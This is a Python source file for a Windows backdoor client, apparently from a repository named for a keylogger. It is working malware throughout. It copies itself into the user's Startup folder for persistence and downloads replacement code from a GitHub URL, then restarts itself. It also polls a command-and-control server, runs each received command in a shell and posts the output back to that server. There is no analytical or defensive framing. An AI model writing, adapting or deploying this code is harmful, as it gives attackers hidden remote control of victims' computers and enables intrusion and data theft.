import requests
import subprocess
import time
import os
import sys

# Constants
SERVER_URL = 'http://192.168.56.1:5000'
GITHUB_URL = 'https://raw.githubusercontent.com/JJcoded/keylogger-repo/refs/heads/main/client.py'
LOCAL_PATH = os.path.abspath(__file__)

def add_to_startup():
    # Windows startup path
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    # Copy script to startup if not already there
    if not os.path.exists(os.path.join(startup_path, os.path.basename(LOCAL_PATH))):
        with open(os.path.join(startup_path, os.path.basename(LOCAL_PATH)), 'wb') as f:
            f.write(open(LOCAL_PATH, 'rb').read())

def check_for_updates():
    try:
        response = requests.get(GITHUB_URL)
        response.raise_for_status()
        with open(LOCAL_PATH, 'rb') as current_file:
            current_version = current_file.read()
        if current_version != response.content:
            with open(LOCAL_PATH, 'wb') as f:
                f.write(response.content)
            # Restart script after updating
            os.execl(sys.executable, sys.executable, *sys.argv)
    except Exception as e:
        print(f"Update check failed: {e}")

def communicate_with_server():
    try:
        req = requests.get(SERVER_URL, timeout=5)
        c2_command = req.text
        if 'terminate' in c2_command:
            sys.exit()
        else:
            CMD = subprocess.Popen(c2_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            requests.post(SERVER_URL, data=CMD.stdout.read())
    except (requests.ConnectionError, requests.Timeout):
        print("Server down. Reconnecting...")

if __name__ == "__main__":
    # Add to startup if not already added
    add_to_startup()
    
    # Continuous loop for checking server and updating
    while True:
        # Check for updates on GitHub
        check_for_updates()
        
        # Attempt communication with the server
        communicate_with_server()
        
        # Sleep to avoid spamming requests
        time.sleep(10)
